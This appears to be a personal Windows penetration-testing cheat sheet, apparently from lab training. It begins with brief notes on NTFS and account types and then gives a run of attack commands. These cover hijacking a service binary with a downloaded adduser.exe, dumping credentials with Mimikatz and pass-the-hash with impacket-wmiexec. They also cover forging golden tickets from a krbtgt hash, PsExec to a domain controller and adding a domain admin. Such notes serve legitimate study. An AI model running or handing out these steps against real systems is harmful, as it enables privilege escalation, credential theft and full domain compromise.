# Windows

the system environment variable for the Windows directory is `%windir%`.

The `System32` folder holds the important files that are critical for the operating system.

## File system

The file system used in modern versions of Windows is the New Technology File System or simply NTFS.

Before NTFS, there was FAT16/FAT32 (File Allocation Table) and HPFS (High Performance File System).

You still see FAT partitions in use today. For example, you typically see FAT partitions in USB devices, MicroSD cards, etc. but traditionally not on personal Windows computers/laptops or Windows servers.

NTFS is known as a journaling file system. In case of a failure, the file system can automatically repair the folders/files on disk using information stored in a log file. This function is not possible with FAT.

## Users

User accounts can be one of two types on a typical local Windows system: Administrator & Standard User.

The user account type will determine what actions the user can perform on that specific Windows system.

An Administrator can make changes to the system: add users, delete users, modify groups, modify settings on the system, etc.
A Standard User can only make changes to folders/files attributed to the user & can't perform system-level changes, such as install programs.

## Troubleshooting

`C:\Windows\System32\control.exe /name Microsoft.Troubleshooting`

## Commands

### RDP connections

xfreerdp /u:username /p:password /d:domain-name /v:IP-address /w:1920 /h:1080 /fonts /smart-sizing

### Initial enum commands

hostname
whoami
whoami /groups
net user

### Enumeration running services

Get-CimInstance -ClassName win32*service | Select Name,State,PathName,StartName | Where-Object {$*.State -like 'Running'}

### Service binary enumeration

icacls "C:\xampp\apache\bin\httpd.exe"
icalcs "C:\xampp\mysql\bin\mysqld.exe"

### Enumerate specific service

Get-CimInstance -ClassName Win32_Service -Filter "Name='mysql'" | Select-Object StartMode

### Compile adduser.c and configure web server

x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
python3 -m http.server 80

### Download binary, move it, verify user

iwr -uri http://192.168.x.xx/adduser.exe -OutFile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld_backup.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
net user

### Restarting service

net stop mysql (fails)

Get-CimInstance -ClassName Win32_Service -Filter "Name='mysql'" | Select-Object StartMode
Restart-Computer -WhatIf (or whoami /priv)
Restart-Computer

### Download Mimikatz, dump credentials

iwr -uri http://192.168.1.47/mimikatz.exe -OutFile mimikatz.exe
mimikatz.exe
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

### Lateral movement 1

/usr/bin/impacket-wmiexec -hashes :a57b67b0bfe5dbd258226194f0caf201 corp/mary@192.168.x.xx

### Find PS History

C:\users\jeff\appdata\roaming\microsoft\windows\powershell\psreadline>type ConsoleHost_History.txt

### PsExec to DC

PsExec64.exe \\dc01 cmd.exe

### Golden ticket information - Dump SID and KRBTGT hash (on DC)

PS C:\pentst> .\mimikatz.exe
mimikatz privilege::debug
mimikatz token::elevate (DONT NEED THIS)
mimikatz lsadump::lsa /patch

### Create golden ticket (write to file in this case)

PS C:\Tools> .\mimikatz.exe
mimikatz kerberos::purge

mimikatz kerberos::golden /user:michael /domain:http://corp.com /sid:S-1-5-21-424464709-3473652527-2093888899 /krbtgt:4199649f577fc4f18891600906044e88 /ticket:golden

### Super golden ticket

kerberos::golden /user:michael /domain:http://corp.com /sid:S-1-5-21-424464709-3473652527-2093888899 /krbtgt:4199649f577fc4f18891600906044e88 /ticket:corp_super_golden /endin:2147483647

### Inject ticket to memory

C:\Tools> mimikatz.exe
mimikatz kerberos::ptt golden

### PsExec to DC

PsExec64.exe \\dc01 cmd.exe

### Verify groups

whoami /groups

### Adding a domain admin

net user mighty Password123! /add /domain
net group "domain admins" mighty /add /domain
